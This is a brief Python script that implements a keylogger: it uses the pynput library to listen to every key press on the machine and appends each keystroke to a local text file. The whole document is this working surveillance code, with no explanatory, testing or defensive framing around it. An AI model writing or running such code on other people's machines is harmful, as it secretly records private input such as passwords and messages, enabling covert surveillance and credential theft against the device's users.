from pynput.keyboard import Listener
def keylogger(key):
    key = str(key).replace("'","")
    with open('keylogger.txt','a') as file:
        file.write(key)
with Listener(on_press=keylogger) as listener:
    listener.join()